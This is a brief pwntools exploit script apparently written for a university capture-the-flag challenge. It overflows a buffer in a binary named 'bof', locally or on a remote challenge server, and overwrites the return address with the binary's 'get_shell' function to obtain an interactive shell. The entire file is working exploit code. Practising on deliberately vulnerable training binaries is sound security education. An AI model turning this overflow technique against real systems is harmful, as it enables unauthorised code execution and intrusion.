from pwn import *

context.log_level = "INFO"

target_file = "./bof"

LOCAL = True

if LOCAL:
    p = process(target_file)
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1280)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")

e = ELF(target_file, checksec=False)
get_shell_addr = e.symbols.get_shell
print(hex(get_shell_addr))
p.recvuntil("> ")
p.sendline(b'B' * 0x28 + p64(get_shell_addr))
p.interactive()
